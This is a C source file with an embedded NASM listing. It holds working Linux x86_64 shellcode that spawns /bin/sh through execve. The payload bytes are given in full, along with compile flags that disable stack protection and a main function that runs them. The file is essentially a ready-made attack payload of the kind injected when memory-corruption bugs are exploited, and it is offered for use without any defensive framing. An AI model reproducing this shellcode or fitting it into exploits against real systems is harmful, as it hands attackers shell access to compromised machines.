/* Linux x86_64 Shellcode
 * execve('/bin/sh')
 * file format elf64-x86-64
 * gcc -z execstack -fno-stack-protector shellcode.c -o shellcode
[nASM]
BITS 64
global _start

section .text
_start:

xor rax, rax
mov rsi, rax
mov rdx, rax
mov al, 59 ; sys_execve
mov rdi, 0xff68732f6e69622f ; ASCII '/bin/sh'
push rdi
xor byte [rsp+7], 0xff ; fix null byte
mov rdi, rsp
syscall
 */

#include<stdio.h>
#include<string.h>

unsigned char payload[] =
"\x48\x31\xc0"
"\x48\x89\xc6"
"\x48\x89\xc2"
"\xb0\x3b"
"\x48\xbf\x2f\x62\x69\x6e\x2f"
"\x73\x68\xff"
"\x57"
"\x80\x74\x24\x07\xff"
"\x48\x89\xe7"
"\x0f\x05";

void main() {
printf("Shellcode Length: %d\n", (int) strlen(payload));
(*(void (*)()) payload)();
}
